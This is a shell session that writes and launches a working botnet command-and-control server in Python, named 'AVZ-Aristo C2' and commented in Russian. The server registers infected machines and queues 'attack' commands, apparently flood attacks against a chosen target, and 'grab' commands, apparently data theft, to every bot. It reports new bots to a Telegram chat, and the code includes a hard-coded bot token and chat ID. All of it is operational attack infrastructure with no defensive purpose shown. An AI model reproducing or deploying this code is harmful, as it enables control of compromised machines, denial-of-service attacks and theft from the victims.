cat > /root/c2/botnet/c2.py << 'EOF'
#!/usr/bin/env python3
# AVZ-Aristo C2 – минимальный, без тяжёлых зависимостей
import asyncio, json, os, time
from datetime import datetime
from aiohttp import web

HTTP_PORT = 80
API_PORT = 8080
BOTS_FILE = "bots.json"
COMMANDS_FILE = "commands.json"

# Телеграм (если не нужен, можно оставить пустым)
TELEGRAM_TOKEN = "8801568177:AAG8KfuLv79gJ0VEhL85QwmOB4OL9R1KNto"
TELEGRAM_CHAT_ID = "2119367196"

def telegram_notify(msg):
    if not (TELEGRAM_TOKEN and TELEGRAM_CHAT_ID):
        return
    try:
        import requests
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": msg},
            timeout=5
        )
    except:
        pass

bots = {}
if os.path.exists(BOTS_FILE):
    with open(BOTS_FILE) as f:
        bots = json.load(f)

commands_queue = {}
if os.path.exists(COMMANDS_FILE):
    with open(COMMANDS_FILE) as f:
        commands_queue = json.load(f)

def save_bots():
    with open(BOTS_FILE, "w") as f:
        json.dump(bots, f, indent=2)

def save_commands():
    with open(COMMANDS_FILE, "w") as f:
        json.dump(commands_queue, f, indent=2)

async def handle_tcp(reader, writer):
    ip = writer.get_extra_info('peername')[0]
    try:
        data = await asyncio.wait_for(reader.read(4096), timeout=5)
    except:
        writer.close()
        return
    msg = data.decode('utf-8', errors='replace').strip()
    print(f"[TCP:{ip}] {msg[:200]}")

    if msg == "list":
        now = datetime.now()
        bots_list = []
        for bot_ip, bot in bots.items():
            last_seen = datetime.strptime(bot["last_seen"], "%Y-%m-%d %H:%M:%S")
            bot["status"] = "online" if (now - last_seen).total_seconds() < 30 else "offline"
            bots_list.append(bot)
        writer.write(json.dumps(bots_list).encode())
    elif msg.startswith("attack:"):
        parts = msg.split(":", 1)[1].split("|")
        if len(parts) >= 3:
            target, method, threads = parts[0], parts[1], parts[2]
            bot_ips = parts[3].split(",") if len(parts) > 3 else list(bots.keys())
            for bot_ip in bot_ips:
                commands_queue.setdefault(bot_ip, []).append(
                    {"type": "attack", "target": target, "method": method, "threads": int(threads)})
            save_commands()
            writer.write(b"commands queued")
        else:
            writer.write(b"invalid format")
    elif msg.startswith("grab:"):
        bot_ips = msg.split(":", 1)[1].split(",") if ":" in msg else list(bots.keys())
        for bot_ip in bot_ips:
            commands_queue.setdefault(bot_ip, []).append({"type": "grab"})
        save_commands()
        writer.write(b"grab queued")
    elif msg.startswith("stop:"):
        bot_ips = msg.split(":", 1)[1].split(",") if ":" in msg else list(bots.keys())
        for bot_ip in bot_ips:
            commands_queue.setdefault(bot_ip, []).append({"type": "stop"})
        save_commands()
        writer.write(b"stop queued")
    elif msg == "ping":
        if ip in commands_queue and commands_queue[ip]:
            pending = commands_queue.pop(ip)
            save_commands()
            writer.write(json.dumps(pending).encode())
        else:
            writer.write(b"no commands")
        if ip in bots:
            bots[ip]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            bots[ip]["status"] = "online"
            save_bots()
    else:
        # Регистрация нового бота
        info = {}
        try:
            data = json.loads(msg)
            if isinstance(data, dict) and data.get("type") == "register":
                info = data.get("data", {})
            else:
                info = data
        except:
            pass
        hostname = info.get("hostname", "")
        os_info = info.get("os", "")
        cpu = info.get("cpu", "")
        ram = info.get("ram", "")
        is_new = ip not in bots
        bots[ip] = {
            "ip": ip,
            "hostname": hostname,
            "os": os_info,
            "cpu": cpu,
            "ram": ram,
            "status": "online",
            "rps": 0,
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_bots()
        if is_new:
            telegram_notify(f"🟢 Новый бот: {ip} ({hostname})")
        writer.write(b"registered")
    await writer.drain()
    writer.close()

async def start_tcp():
    server = await asyncio.start_server(handle_tcp, '0.0.0.0', HTTP_PORT)
    print(f"[+] TCP C2 на порту {HTTP_PORT}")
    async with server:
        await server.serve_forever()

# HTTP API (оставлено для раздачи агентов и прочего)
async def handle_list(request):
    now = datetime.now()
    bots_list = []
    for bot_ip, bot in bots.items():
        last_seen = datetime.strptime(bot["last_seen"], "%Y-%m-%d %H:%M:%S")
        bot["status"] = "online" if (now - last_seen).total_seconds() < 30 else "offline"
        bots_list.append(bot)
    return web.json_response(bots_list)

async def handle_cmd(request):
    data = await request.json()
    cmd = data.get("cmd")
    if cmd == "attack":
        target = data["target"]
        method = data.get("method", "GET")
        threads = data.get("threads", 100)
        bot_ips = data.get("bot_ips", list(bots.keys()))
        for ip in bot_ips:
            commands_queue.setdefault(ip, []).append(
                {"type": "attack", "target": target, "method": method, "threads": threads})
        save_commands()
        return web.Response(text="commands queued")
    elif cmd in ("grab", "stop"):
        action = "grab" if cmd == "grab" else "stop"
        bot_ips = data.get("bot_ips", list(bots.keys()))
        for ip in bot_ips:
            commands_queue.setdefault(ip, []).append({"type": action})
        save_commands()
        return web.Response(text=f"{action} queued")
    return web.Response(text="unknown")

async def main():
    tcp = asyncio.create_task(start_tcp())
    app = web.Application()
    app.router.add_get('/list', handle_list)
    app.router.add_post('/cmd', handle_cmd)
    # Можно добавить раздачу агентов, но не обязательно для запуска
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', API_PORT)
    await site.start()
    print(f"[+] HTTP API на порту {API_PORT}")
    await tcp

if __name__ == "__main__":
    asyncio.run(main())
EOF

pkill -9 -f botnet/c2.py
screen -dmS c2 python3 /root/c2/botnet/c2.py
sleep 2 && ss -tlnp | grep 80